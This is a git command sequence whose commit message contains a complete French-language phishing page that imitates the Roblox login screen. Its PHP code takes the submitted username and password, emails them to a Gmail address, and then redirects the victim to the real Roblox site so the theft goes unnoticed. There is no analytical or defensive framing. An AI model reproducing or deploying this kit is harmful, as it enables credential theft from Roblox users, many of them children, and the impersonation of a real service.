git add connexion.html connexion.php
git commit -m "<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $identifiant = $_POST['identifiant'];
    $motdepasse = $_POST['motdepasse'];

    $destinataire = "roliavoxylia@gmail.com";
    $sujet = "Nouveaux identifiants Roblox";
    $message = "Identifiant: $identifiant\nMot de passe: $motdepasse";

    mail($destinataire, $sujet, $message);
    
    header("Location: https://www.roblox.com/login");
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Roblox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        .container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .input-group input[type="submit"] {
            background-color: #007bff;
            color: #fff;
            cursor: pointer;
        }
        .input-group input[type="submit"]:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Connexion - Roblox</h2>
        <form action="connexion.php" method="POST">
            <div class="input-group">
                <label for="identifiant">Identifiant :</label>
                <input type="text" id="identifiant" name="identifiant" required>
            </div>
            <div class="input-group">
                <label for="motdepasse">Mot de passe :</label>
                <input type="password" id="motdepasse" name="motdepasse" required>
            </div>
            <div class="input-group">
                <input type="submit" value="Se connecter">
            </div>
        </form>
    </div>
</body>
</html>
"
git push origin main
